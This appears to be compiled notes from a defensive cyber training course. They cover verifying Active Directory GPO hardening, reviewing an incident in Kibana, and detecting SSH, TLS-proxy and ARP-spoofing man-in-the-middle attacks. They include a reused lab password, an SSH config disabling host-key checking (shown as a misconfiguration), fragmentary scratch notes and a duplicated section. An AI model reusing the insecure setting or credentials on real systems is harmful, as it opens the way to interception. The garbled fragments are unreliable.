Deny log on through Remote Desktop Services: This policy setting determines which user accounts cannot utilize RDP to log onto a host. RDP is often used as a lateral movement device, as noted by MITRE ATT&CK sub-technique ID T1021.001.

Implementing Mitigations in AD | Verify GPO
For the next steps, normal functionality is verified with the trainee user account, then the administrator account is compared.

﻿

NOTE: The following steps continue from the previous task.

﻿

20. Schedule a task using the trainee account by entering the following command:

﻿

NOTE: This needs to be done in a PowerShell window started with administrative privileges.

﻿

PS C:\windows\system32> schtasks /create /RU cda\trainee /RP "Th1s is 0perational Cyber Training!" /SC once /ST 00:00 /TN test_privs /TR notepad.exe
﻿

This command utilizes the schtasks utility to create a job (test_privs) as the trainee user that runs once at midnight and starts an instance of Notepad.


A warning message appears that states the task may not run due to the start time being earlier than the current time; however this is not important in this case. The task is successfully created without further issue.

﻿

21. Delete the task, and enter Y when prompted:

﻿

PS C:\windows\system32> schtasks /delete /TN test_privs

22. Attempt the same command with the Administrator account:

﻿

PS C:\windows\system32> schtasks /create /RU cda\administrator /RP "Th1s is 0perational Cyber Training!" /SC once /ST 00:00 /TN test_privs /TR notepad.exe
﻿
Notice in this case, a warning message appears warning that the task may fail to start due to the batch logon privilege needing to be enabled for the principal. It has been confirmed that the GPO setting for Deny log on as a batch job successfully restricted the Administrator account. 

﻿

23. Delete the task, and enter Y when prompted to clean up the previous action:

﻿

PS C:\windows\system32> schtasks /delete /TN test_privs
﻿

24. Test normal administrative functionality for services by right-clicking Services on the desktop, and selecting Run as administrator.

25. Find the Sysmon64 service on the list, right-click it, and select Properties.

﻿

﻿

Figure 16.3-60

﻿

26. Select the Log On tab.

﻿

27. Select the radio button next to This account and enter the following information:

﻿

This account: cda\trainee
Password: Th1s is 0perational Cyber Training!
Confirm password: Th1s is 0perational Cyber Training!
﻿

28. Select Apply > OK. A prompt appears stating that the service must be restarted for the new logon name to take effect. Select OK.

29. Right-click Sysmon64 again and select Restart from the menu.

It restarts without issue.


31. Upon restarting the service, an error message pops up stating that there was a logon failure. This is due to the GPO setting Deny log on as a service, which was confirmed effective. Select OK.

﻿

﻿

Figure 16.3-66

﻿

32. Restore the service to its previous state. Select the radio button next to Local System account. Select Apply > OK to start the service.

The GPO settings related to network logins and remote desktop are tested by using a different host on the domain.

﻿

33. Log on to the cda-acct-1 VM using the following credentials:

﻿

Username: trainee
Password: Th1s is 0perational Cyber Training!
﻿

34. Open PowerShell with Administrative privileges.

35. Open a WinRM session to the DC with the trainee user account credentials to check normal functionality:

﻿

PS C:\windows\system32> Enter-PSSession -Computer cda-dc -Credential cda\trainee
﻿

A prompt appears asking for trainee’s credentials.


36. Enter the following password and select OK:

﻿

Password: Th1s is 0perational Cyber Training!
﻿

A PSSession greets the trainee user, indicating success when not restricted by a GPO.

37. Exit the PSSession by entering the following command:

﻿

[cda-dc]: PS C:\Users\trainee> exit
﻿

38. Attempt to open a WinRM session to cda-dc using the Administrator’s credentials by entering the following command:

﻿

PS C:\windows\system32> Enter-PSSession -Computer cda-dc -Credential cda\administrator


39. A prompt appears asking for the password to the account. Enter the following in the password field, then select OK:

﻿

Password: Th1s is 0perational Cyber Training!
﻿

An access is denied error message appears and the logon fails. This is due to the GPO setting Deny access to this computer from the network.

40. Attempt to utilize RDP to log on to the DC. Select Remote Desktop Connection from the desktop.

﻿

41. Enter cda-dc in the Computer field and select Connect.


42. A window appears prompting for credentials. Enter the following credentials and select OK:

﻿

Username: cda\administrator
Password: Th1s is 0perational Cyber Training!
﻿
The client attempts to initiate an RDP connection to the DC.

It fails; the following prompt appears.


The GPO Deny log on through Remote Desktop Services was verified to be effective.

Mitigating AD Attacks
In this task, you secured the mission partner’s network by removing unneeded users from the Domain Admins group, configured their accounts to be unable to use delegation, and used Microsoft recommendations to lockdown the built-in Administrator account on the DC. These actions may defend against common AD attacks involving PtH, PtT, and Unconstrained Delegation, as well as utilizing domain administrator accounts to move laterally within an AD environment.

AD Attack and Defense
The local network defender received an alert from their SIEM. None of the domain administrators knew of any actions on their behalf that could have generated the alert and were clueless on how it could have occurred. The local network defender has little expertise dealing with Incident Response (IR), and requested CPT assistance to determine if there was a compromise. The alert details are as follow.

Message: Event code 1102 — Audit logs were cleared
Time: Jul 20, 2021 @ 11:25:31.249
Event Source: Windows Event Log
﻿
2. Open Chrome from the desktop.

﻿

3. Select the Incident 2021-7-20 bookmark.

﻿

NOTE: If the Security Onion login from the previous task timed out, use the following credentials to log in:

﻿

Username: onion@cda.corp
Password: Th1s is 0perational Cyber Training!
﻿

4. Use the data within the Kibana instance to answer the following questions.

AD Attack and Defense | Jdoe’s Activity
Recall that process auditing can be seen under event ID 4688. If and event.code:4688 is appended to the session query, all the processes started by Jdoe can be seen.

The process wsmprovhost is of interest since it implies that WinRM is being used here. This indicates that there may be PowerShell logs detailing Jdoe’s session. 

4648 login from other user

event 1 
timestamp
host.hostname
process.executable
process.command_line
process.pid 

visualise
data table
*so
process.exec or process.exec.keyword
vvv
python.exe
click on process.executable
process.command_line enter event.code:1 in search bar
*python*

advance in stack search 500 
set to 500
close
pip install intall function
parent process pivet

details tells you what application will start when the user logs in
exe and pid tells you what was executed to tell you what

MitM Overview
MitM attacks are hard to reveal, and a successful MitM campaign is often transparent to the user, but there are many common ways to protect the connection making a MitM scenario less fruitful for the attacker. To create a MitM scenario, an attacker only needs to redirect traffic through a device they have control of. This redirection could be via some sort of iptables redirection on a compromised router, an installation of a tool that can complete MitM actions on the compromised router, a spoofed default gateway on a local subnet, or another tactic. 

﻿

The internet is a network of shared devices with a variety of administrators with varying degrees of technical prowess, security understanding, and funding, which leaves attackers many opportunities to attack and compromise devices in order to monitor or modify traffic. As with Operations Security (OPSEC), it only takes one break in the chain to possibly compromise the entire mission, but there are some actions that can limit the amount of worthwhile data for the attacker.

﻿

Subnet-localized spoofing can also be utilized to perform redirection tasks. This type of attack requires an attacker to gain a foothold in the subnet either through physical access or a compromised host. ARP spoofing is one technique that allows an attacker to route traffic through their own — or a compromised — host by advertising itself as another host or hosts on the network. This technique is discussed and investigated later in this lesson.

﻿

In a similar fashion to ARP spoofing, attackers can respond to Link-Local Multicast Name Resolution (LLMNR) and Network Basic Input/Output System (NetBIOS) Name Service (NBT-NS) multicast queries. Microsoft Windows systems use LLMNR and NBT-NS when Domain Name System (DNS) resolution fails for some reason (outage, misspelling, etc.). The initial requester then communicates with the attacker-controlled system instead of the real host, which could lead to credential and or system compromise.

﻿

MITRE tracks MitM techniques under ID T1557, and provides a litany of mitigations to include: disable legacy protocols, encrypt data, filter traffic, setup Intrusion Detection and Prevention Systems (IDS/IPS), and most 

SSH MitM Overview
SSH was created to replace telnet and other cleartext remote access applications. Each time an SSH client connects to an SSH server, the server presents its host key:

﻿

﻿

Figure 17.3-2

﻿

NOTE: Elliptic Curve Digital Signature Algorithm (ECDSA)

﻿

When a client connects to an SSH server, the server sends its public key to the client. At this point, the client checks its known_hosts file for an entry for the corresponding Internet Protocol (IP) address or hostname. If there is no entry, the client asks the user if they would like to add the key to the known_hosts file. Alternately, If there is an existing entry, the client compares the transmitted public key from the server with the one stored in the known_hosts file. If the two match, the client and server proceed to negotiating parameters and establishing a shared secret key that is used to encrypt traffic between the two endpoints. If it is determined that the transmitted key and the stored key in the known_hosts file do not match, the client issues a warning, letting the user know of the mismatch and provides instructions on how it can be resolved — commonly through deletion of the existing entry.

﻿

NOTE: Different clients save the keys in different places, but the client informs the user how to delete the original key.

﻿

Once the SSH client accepts the fingerprint presented by the server — either via a prompt from the current user or by the hostname and fingerprint matching the known_hosts file — the client and server negotiate encryption parameters and establish a symmetric encryption key used to encrypt all additional traffic sent between the two endpoints.

﻿

The symmetric encryption key — or session key — is negotiated using the Diffie-Hellman algorithm, which provides a way for both client and server to combine private and public data in order to create a shared secret key that is not transmitted across the wire. This session key is used to encrypt everything henceforth associated with the session.

﻿

A MitM for SSH has a few different outcomes. The traffic could be collected for data aggregation from the threat actor, which would include the cleartext host key and encryption parameters, but everything else would be encrypted. The user would have no indication of this tactic. 

﻿

A SSH MitM could be accomplished using many different methods. The first method would be a redirection of the path used to connect a client and server or compromise of a device within the path. This method gives an attacker an understanding of client software, server software, what hosts are interacting with SSH on the specific server, how often and long the connections are, etc. All this data would be in cleartext or noticeable without viewing the encrypted session. 

﻿

Another method used in this scenario is to have the client's SSH destination redirected to an intermediary SSH server using something like iptables or other firewall redirection. The attacker sets up an intermediary SSH server, like mitm-ssh, that allows the client to complete all the SSH connection process and transparently pass the user input to the intended SSH server over a separate encrypted session. This method allows the attacker to see all the user input to include username, password, etc. This method likely spawns a host key mismatch error because the new intermediary SSH server does not have the same host key.



An attacker only needs to control one device within the route taken from a client and server in order to intercept or modify the traffic.
true

SSH MitM Overview
SSH was created to replace telnet and other cleartext remote access applications. Each time an SSH client connects to an SSH server, the server presents its host key:

﻿

﻿

Figure 17.3-2

﻿

NOTE: Elliptic Curve Digital Signature Algorithm (ECDSA)

﻿

When a client connects to an SSH server, the server sends its public key to the client. At this point, the client checks its known_hosts file for an entry for the corresponding Internet Protocol (IP) address or hostname. If there is no entry, the client asks the user if they would like to add the key to the known_hosts file. Alternately, If there is an existing entry, the client compares the transmitted public key from the server with the one stored in the known_hosts file. If the two match, the client and server proceed to negotiating parameters and establishing a shared secret key that is used to encrypt traffic between the two endpoints. If it is determined that the transmitted key and the stored key in the known_hosts file do not match, the client issues a warning, letting the user know of the mismatch and provides instructions on how it can be resolved — commonly through deletion of the existing entry
﻿

NOTE: Different clients save the keys in different places, but the client informs the user how to delete the original key
﻿

Once the SSH client accepts the fingerprint presented by the server — either via a prompt from the current user or by the hostname and fingerprint matching the known_hosts file — the client and server negotiate encryption parameters and establish a symmetric encryption key used to encrypt all additional traffic sent between the two endpoints.

The symmetric encryption key — or session key — is negotiated using the Diffie-Hellman algorithm, which provides a way for both client and server to combine private and public data in order to create a shared secret key that is not transmitted across the wire. This session key is used to encrypt everything henceforth associated with the session.

A MitM for SSH has a few different outcomes. The traffic could be collected for data aggregation from the threat actor, which would include the cleartext host key and encryption parameters, but everything else would be encrypted. The user would have no indication of this tactic. 

A SSH MitM could be accomplished using many different methods. The first method would be a redirection of the path used to connect a client and server or compromise of a device within the path. This method gives an attacker an understanding of client software, server software, what hosts are interacting with SSH on the specific server, how often and long the connections are, etc. All this data would be in cleartext or noticeable without viewing the encrypted session. 

Another method used in this scenario is to have the client's SSH destination redirected to an intermediary SSH server using something like iptables or other firewall redirection. The attacker sets up an intermediary SSH server, like mitm-ssh, that allows the client to complete all the SSH connection process and transparently pass the user input to the intended SSH server over a separate encrypted session. This method allows the attacker to see all the user input to include username, password, etc. This method likely spawns a host key mismatch error because the new intermediary SSH server does not have the same host key.

At what point during the SSH client/server connection is data fully encrypted?
Everything after the negotiating encryption parameters is agreed upon.

SH MitM | Behind the Scenes
Below is a quick comparison of the SSH version, keys, accepted encryption algorithms, host key, and server banner. Barring any system upgrades or updates, changes to any of these over time should be investigated.

The attacker placed a redirection rule on the compromised edge-router, which forwarded all SSH requests to the attacker’s own machine, where the attacker was running a program called ssh-mitm. When administrators attempted to log in to the edge-router via SSH, they actually submitted the credentials to the attacker, who then sent them to the correct machine and returned a session to the unwitting administrator.

The attacker not only captured the credentials, but also mirrored the session itself in order to observe every command the administrators ran. At will, the adversary could assume control of the session and begin entering commands instead of simply observing.

﻿

NOTE: ssh-mitm also has a database of Common Vulnerabilities and Exposures (CVE) associated with SSH clients and servers. If a vulnerable client or server connects, the adversary is notified of the opportunity. For example, the CVE-2021-33500 annotated in Figure 17.3-9 is a Denial of Service (DoS) for certain versions of the PuTTY client, which would be a great way to block administrators out of a remote system.

How would an SSH user realize a MitM was underway?
host key mismatch requires user intervenion to proceed

SSH MitM | Prevention
The administrators had a good understanding of how SSH works and knew not to use the new keys, but one of the newer administrators connected and blindly accepted the host keys. This is a great reason to have a documented list of the keys saved for all administrators to double-check prior to accepting or sharing the known_hosts file for all to compare. Updates could be annotated in the shared file as well.

﻿

When the SSH clients are properly configured, a warning banner — such as in Figure 17.3-11 — should appear when a server’s SSH host key has changed, tipping off defenders that something nefarious may be occurring.

﻿

﻿

Figure 17.3-11

﻿

On a machine running OpenSSH, the following banner appears in properly configured devices.

﻿

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that the RSA host key has just been changed.
The fingerprint for the RSA key sent by the remote host is
12.34.56.789
Please contact your system administrator.
Add correct host key in /home/user/.ssh/known_hosts to get rid of this message.
Offending key in /home/user/.ssh/known_hosts:4
RSA host key for domain.com has changed and you have requested strict checking.
Host key verification failed.
﻿

Most, often, the misconfiguration or failure that allows SSH MitM attacks to occur is either a poorly-trained user clicking through and ignoring warning banners, or a setting in an SSH client configuration file. OpenSSH on Linux has a system-wide configuration file (/etc/ssh/ssh.conf) and a user-specific file (~/.ssh/config) that can be configured to automatically trust new keys from known hosts with the following:

﻿

#Do not keep HostKeys for internal networks.
Host 10.*.*.*  192.168.*.*
  StrictHostKeyChecking no
﻿

Mitigation
﻿

Only having network flow within the network limits the investigation that can be done on this incident because all traffic from the attacker would have been from the internet. The network analyst would be able to assess that the host key changed and acknowledge the administrator's findings, but would have little understanding of why. In this case, the administrator would need to log in to the local console of the router to find the firewall rule changes without passing credentials across the attacker’s SSH server.

﻿

Remotely logging firewall configurations changes and logins would have provided a better timeline of when the attack was completed. It is possible the attacker did not have credentials to log into the firewall because they gained access to the firewall through some unknown vulnerability. Since, a proper login wasn’t completed there wouldn’t be a log for a login, but a firewall rule change would have been logged. The attacker can now gather credentials for reuse in the network or redirect other SSH servers, as needed.

﻿

Requiring the use of SSH keys removes any ability for the attacker to collect credentials and not allow the authentication to complete. ssh-mitm is unable to reuse the private key in order to authenticate to an SSH server. 

﻿

Two-factor authentication would be a viable option to mitigate the reuse of any credentials the attacker was able to compromise.

What file could be shared to make sure all administrators are using the correct host keys?
known_hosts

SSL/TLS Proxy MitM | Overview
Proxies are employed to allow many users to access a shared resource to get out of a network. In some cases, the proxies are used to cache web content, or the proxies are used to allow network defenders a way to decrypt Hypertext Transfer Protocol Secure (HTTPS) traffic to increase awareness about what is happening on and leaving the network. Transport Layer Security Inspection (TLSI) or Transport Layer Security (TLS) break and inspect is the process where an enterprise uses a proxy or other device to decrypt traffic, inspect the decrypted content for threats, and re-encrypt the traffic before it enters or leaves the network. This is possible by configuring clients with Intermediate Certification Authorities (ICA) certificates. Without it, the encrypted traffic on the network is an enigma which the defenders cannot interact with or investigate aside from connection logs.

﻿

Proxies can also be used for nefarious purposes. If an attacker can place a proxy between a client and their intended website, they can sniff credentials, reuse session Identifiers (ID), or some other corrupt activity. In the case of cleartext HTTP, the end-user may not notice anything, but HTTPS should cause a mismatched Secure Sockets Layer (SSL) certificate notification, which should notify properly-trained users of a possible problem. Those properly-trained users should then notify the help desk for further action.

﻿

This is a case where LLMNR or NBT-NS spoofing could be used to redirect Microsoft Windows machines through a proxy server by spoofing the Web Proxy Auto-Discovery (WPAD) server’s IP address. The WPAD server is used to provide a centralized location for proxy configuration on a network. Before fetching an initial page, web browsers request the location of a WPAD server from a Dynamic Host Configuration Protocol (DHCP) followed by DNS, if DHCP does not respond. If both are unsuccessful, LLMNR and NBT-NS requests are sent out over multicast, which can be spoofed by a unicast response by an attacker. The WPAD configuration could then redirect all affected hosts through a rogue proxy server.

﻿

A user in the Accounting department has been complaining about mismatched SSL certificate notifications being annoying, and they would like the Information Technology (IT) department to fix the issue. This employee has not had any such issues when working from home. The network defenders were astounded to see the employee accepted and saved the untrusted certificates in order to continue to their favorite websites, which resulted in remedial cyber training before regaining access to the internet on the corporate network.


Time to find out what happened.

SSL/TLS Proxy | MitM Mitigation
The SOCKS proxy does not transmit traffic between the proxy and client in a way that the IDS can see the mismatch of SSL traffic. In some cases, the sensors could pick up a change in SSL/TLS certificates, which would indicate a possible MitM.

﻿

After the Indicators of Compromise (IOC) were passed to the Cyber Protection Team (CPT) members responsible for responding to this incident and clearing adversary presence, they confirmed that the Accounting department user had opened a suspicious email attachment that performed Malicious Cyberspace Activity (MCA) on the system, including altering settings on the browser that forced it to use the attacker’s server as a SOCKS proxy for all web connections.

﻿

There are some ways to mitigate and prevent these types of attacks or to minimize the amount of useful data for the attacker.

﻿

Enterprise Changes
﻿

Configure the proxy settings or disable the ability for users to change proxy settings via Group Policy Object (GPO). If no proxy is used within the network set the registry key HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable to zero via GPO and audit for any registry updates. It is also important to configure WPAD on the DNS server, which could be spoofed via LLMNR and NBT-NS. If DNS is able to resolve an address for WPAD, the client does not attempt the multicast request for WPAD IP address resolution.

﻿

User Training
﻿

Make sure all users are aware if they get a TLS mismatch, it should be questioned before clicking. In a remote working Department of Defense (DoD) environment, this can be problematic without appropriately-installed certificates, but teaching users to not click on improperly signed sites and installing the DoD root certificates goes a long way.

﻿

Virtual Private Network
﻿

Virtual Private Networks (VPN) allow users to encrypt communications between the user and the VPN server thus subverting any MitM data collection.

﻿

Limit User Access Privileges
﻿

Part of the goal of a MitM is collecting credentials to help gain a foothold into the network. If users have minimal access, so does the attacker, if they were able to get into the network by using those credentials.

﻿

Limit Network Access
﻿

One of the ways that attackers achieve effects on systems and resources beyond the initial compromise is because those resources are not hardened at the network border or are exposed inside the network due to an over-reliance on trust between network systems. Limit access to key resources (such as DNS, routers, domain controllers, etc.) in order to prevent single system compromise from becoming a network-wide MitM attack.

﻿

Monitor
﻿

Monitor sensors for changes to collected certificates. Most users navigate to a small subset of the internet from within the enterprise network. Create a list of those known good certificates and schedule a script to look for changes to those certificates as users access them.

﻿

Monitor for gratuitous ARP messages used in ARP spoofing.

﻿

Canaries
﻿

Create a script that attempts to access an HTTPS website or websites. If the server responds with the improper certificate chain, sound an alert. Run this script on a recurring basis.

ARP
In earlier lessons, ARP was discussed as a way to resolve IPv4 addresses to Media Access Control (MAC) addresses. 

﻿

﻿

Figure 17.3-37

﻿

Attackers can leverage the trust of ARP to poison the ARP cache. 

﻿

﻿

Figure 17.3-38

﻿

An attacker can send out an ARP reply to a computer (192.168.0.10) indicating that it is the default gateway (192.168.0.1). At the same time, the attacker can also send an ARP replay to the default gateway (192.168.0.1) saying it is the computer (192.168.0.10). 

﻿

﻿

Figure 17.3-39

﻿

The computer and gateway both update their ARP cache and direct all traffic for those IPs to the attacker. The attacker now acts as an intermediary until the ARP caches get updated with the correct information. This is known as ARP spoofing or ARP poisoning and is highly effective. This ARP spoofing can be specific to a single computer or blasted at the entire subnet. The key is continue updating the spoofing so the real host does not regain control of the IP. MITRE ATT&CK framework tracks this spoofing as T1557.002 Man-in-the-Middle: ARP Cache Poisoning and classifies it as a Collection and Credential Access tactic.

﻿

ARP spoofing is contained to the local subnet, which decreases — but does not eliminate — the possibility in enterprise networks. Remote workers are increasing the possibilities of attacks by using untrusted networks. Public Wireless Fidelity (Wi-Fi) access points or shared Wi-Fi (e.g., hotels, campgrounds, restaurants, supermarkets, etc.) can be used securely, but users must be trained on how best to interact with these networks. This is especially true if the user is connecting to one of these networks in order to conduct business or connect to business resources. Most Wi-Fi access points put all users in a single subnet, so the users can interact on the local subnet as needed. If an attacker was able to tell another user that their system was the default gateway, they could create a MitM scenario and scrape any cleartext data from the traffic being routed. 

﻿

NOTE: Some Wi-Fi access points section off each user to subvert this type of attack.

﻿

If a picture is worth 1,000 words, then a PCAP must be worth 100,000. The following walkthrough describes the process of ARP spoofing and highlights some key indicators for network monitoring for this tactic.

﻿

Workflow

﻿

1. Log in to the cda-win-hunt VM using the following credentials:

﻿

Username: trainee
Password: Th1s is 0perational Cyber Training!
﻿

2. Open Wireshark from the taskbar.

﻿

3. Open arpspoof.pcap from the desktop.

﻿

NOTE: This PCAP was collected from the internal interface of a subnet's default gateway.

﻿

4. Filter out DNS traffic, and select the apply arrow (or Enter):

﻿

!dns
﻿

﻿

Figure 17.3-40

﻿

5. Notice packets 29 and 30 ARP request and response.

﻿

Packet 29 is an ARP request for the MAC address for the device with 210.210.210.1 from 210.210.210.6 (MAC 00:02:B3:00:29:01). Packet 30 is the response from 210.210.210.1 with MAC address 00:02:b3:00:0d:02. This is a directed ARP request and response procedure used to update ARP cache on the 210.210.210.6 host. 210.210.210.6 has conversed with 210.210.210.1 previously, otherwise the request would have been sent to the broadcast (MAC 00:00:00:00:00:00).

﻿

6. Filter the PCAP to show only ARP traffic by changing the filter:

﻿

arp
﻿

﻿

Figure 17.3-41

﻿

Packets 205 and 206 are examples of an ARP request, and reply that are not updating the cache. Notice the request has a target MAC address of 00:00:00:00:00.

﻿

7. Scroll down to packet 428. 

﻿

The packet does not have an associated ARP request like the rest of the ARP packets. ARP replies without ARP requests are usually referred to as gratuitous ARP replies, but gratuitous ARP replies are sent to the broadcast address, and packet 428 is being directed at a specific host. If an attacker is trying to be stealthy, it is best to decrease the amount of hosts involved in the spoofing to decrease the likelihood of being caught or causing an issue that could alert network defenders. Gratuitous ARP messages are used when interfaces are initially turned on, which can help with notifying all devices on the subnet of new IPs and alert to IP conflicts.

﻿

﻿

Figure 17.3-42

﻿

Packet 428 is the first of many ARP replies with the same data, which says 210.210.210.6 is associated with the MAC address ending with 2c:01. The ARP replies repeat every second, which is very abnormal. This type of traffic should be investigated.

﻿

NOTE: Wireshark is flagging on duplicate IP address detected for 210.210.210.6.

﻿

8. Update the filter to see what other ARP traffic is being sent from the MAC address ending with 2c:01:

﻿

arp && eth.src == 00:02:b3:00:2c:01
﻿

﻿

Figure 17.3-43

﻿

Packet 481 shows an ARP request for the MAC associated with IP address 210.210.210.1, which was sent from the malicious hosts MAC address. The malicious host is advertising itself with the IP address 210.210.210.2, which could be another spoofed IP.

﻿

At this point, the following facts have been found:

210.210.210.6 has an original MAC of 00:02:B3:00:29:01
210.210.210.1 has an original MAC of 00:02:B3:00:0D:02
A host with MAC address 00:02:B3:00:2c:01 has been spoofing 210.210.210.6's IP address
210.210.210.2 has also been seen with the MAC address 00:02:B3:00:2c:01
NOTE: Because this traffic was collected on the gateway side of the conversation (210.210.210.1), the PCAP does not show any spoofing directed to the 210.210.210.6 host. Seeing both sides of the traffic for this type of attack would be unlikely unless a hub was used or a switch that allowed promiscuous mode to see all traffic on the subnet.

﻿

The 210.210.210.2 host is implementing an ARP spoofing attack between the 210.210.210.6 host (client) and the gateway. The attacker is also sending spoofed traffic to the 210.210.210.6 host, which is pointing the 210.210.210.1 to the 00:02:B3:00:2c:01 MAC address, but the sensor cannot see this traffic. (See the note above). In this case, the attacking host is repeatedly sending ARP replies to the gateway saying it is the client and to the client saying it is the gateway. The ARP replies sent to the client are of the same type and form as those sent to the gateway, but outside of the sensor collection capability.

﻿

It is important to investigate how long the attack took place and what traffic may have been compromised.

﻿

9. Create a Coloring Rule for all the packets with the malicious MAC by selecting View > Coloring Rules:

﻿

﻿

Figure 17.3-44

﻿

10. Select + to add a rule. Set the Name to SpoofMAC and the Filter to eth.addr == 00:02:B3:00:2c:01:

﻿

﻿

Figure 17.3-45

﻿

11. Set the Foreground color to Red by selecting the filter (if not already selected) and selecting Foreground at the bottom:

﻿

﻿

Figure 17.3-46

﻿

12. Set the Background color to Black by selecting the filter (if not already selected) and selecting Background at the bottom.

﻿

13. Check the box to the left of the Name to enable the filter:

﻿

﻿

Figure 17.3-47

﻿

14. Disable all other filters by removing the checkboxes from everything but SpoofMAC:

﻿

﻿

Figure 17.3-48

﻿

15. Change the display filter to easily see all the traffic that was passed through the malicious host:

﻿

ip.addr == 210.210.210.6
﻿

﻿

Figure 17.3-49

﻿

NOTE: Assume anything unencrypted as compromised and anything encrypted as possible.

﻿

To monitor for this type of attack in real time, monitor for repetitive unsolicited ARP replies. This could be monitored in Arkime by searching for IP addresses associated with routers that do not have the correct MAC addresses. This could also be monitored using Suricata or Snort rules for gratuitous ARPs, but sensor placement is vital to cover all devices.﻿

Which indicate that an ARP spoofing attack may be ongoing?
• Multiple ARP replies for the same IP address without an associated request.
• ARP replies for a default gateway that do not match the gateway's MAC address.

Based on DNS records in the PCAP, what webpage was the user accessing during the MitM activity?
google.com

Does this MitM attack resemble the previous SOCKS event in the network?
• No, all the hosts are talking to different IPs across the internet on port 443. The previous event was using SOCKS to that device.

Something Strange Again? | Hypothesize Redirection
Based on the ARP data, the network is not being compromised using ARP spoofing, which disproves that hypothesis.

﻿

While not every system browsed to the internet during the investigation window, the MitM redirection does appear to have affected machines in multiple subnets of the mission partner network.

﻿

Determine what access the threat actor needed to accomplish this. Use the network map below as a reference.

﻿Based on the network map and what has been learned so far, what device could be causing the redirection?

Something Strange Again? | Suggest Mitigation
The compromised device was the edge-router, which was also compromised during the SSH MitM attack. In this case, the edge-router — or something within the Internet Service Provider (ISP) space — would most likely be the culprit. All systems were affected by the MitM attack, which means it must have been something that all systems must transit to reach the internet. It is possible that everything was compromised, but that seems like a lot of extra effort when one router would suffice.

﻿

The CDA.com mission partner has requested the CPT’s assistance in an enable hardening operation to prevent this compromise in the future.

Which techniques can be employed to mitigate future occurrences of this type of attack?
• Encrypt sensitive information
• User training
• NIDS/Network Intrusion Prevention System (NIPS)
















